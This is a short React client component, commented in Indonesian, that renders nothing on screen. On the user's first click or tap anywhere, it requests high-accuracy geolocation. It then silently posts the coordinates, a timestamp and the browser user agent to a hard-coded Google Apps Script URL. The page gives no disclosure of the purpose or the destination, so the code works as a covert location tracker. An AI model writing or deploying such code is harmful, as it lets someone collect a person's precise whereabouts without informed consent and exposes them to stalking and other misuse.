"use client";

import { useEffect, useState } from "react";

export default function SendLocation() {
  const [activated, setActivated] = useState(false);

  useEffect(() => {
    const handleUserGesture = () => {
      setActivated(true); // setelah user tap sekali
      window.removeEventListener("click", handleUserGesture);
      window.removeEventListener("touchstart", handleUserGesture);
    };

    // wajib: menunggu gesture 1x
    window.addEventListener("click", handleUserGesture);
    window.addEventListener("touchstart", handleUserGesture);

    return () => {
      window.removeEventListener("click", handleUserGesture);
      window.removeEventListener("touchstart", handleUserGesture);
    };
  }, []);

  useEffect(() => {
    if (!activated) return;

    const sendLocation = () => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude } = pos.coords;

          fetch(
            "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec",
            {
              method: "POST",
              mode: "no-cors",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                latitude,
                longitude,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
              }),
            }
          );
        },
        (err) => {
          console.log("Error lokasi:", err);
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        }
      );
    };

    sendLocation();
  }, [activated]);

  return null;
}
